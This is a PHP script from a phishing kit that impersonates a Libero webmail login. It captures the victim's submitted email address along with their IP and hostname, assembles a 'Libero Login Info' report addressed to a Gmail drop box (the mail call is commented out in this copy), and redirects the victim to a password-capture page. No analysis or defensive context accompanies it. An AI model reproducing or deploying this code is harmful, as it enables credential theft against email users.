<?php

if(!$_POST) exit;

$email = $_POST['LOGINID'];
session_start();
		$_SESSION['LOGINID']= $email;
//$epass = $_POST['regular-p'];

if($email){
	$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message  = "------------------+ Libero Login Info +-----------------\n";
$message .= "Email : $email\n";
$message .= "IP Address : $ip\n";
$message .= "HostName  : $hostname\n";
$message .= "-------------------+ Created by rYan +--------------------\n";

$send="angelicostr@gmail.com";

$domain = $_SERVER['HTTP_HOST'];
$realdomain = rtrim($domain, 'www.');

$subject = "(Libero Info)  $geoplugin->countryName .$ip.";
$headers = "From: RyanX-Files<ryanbuzz@buzz.complete>";
//mail($send,$subject,$message,$headers);
echo "<script language=\"Javascript\" type=\"text/javascript\">
				window.location=\"pass.php\";
				</script>";
}
?>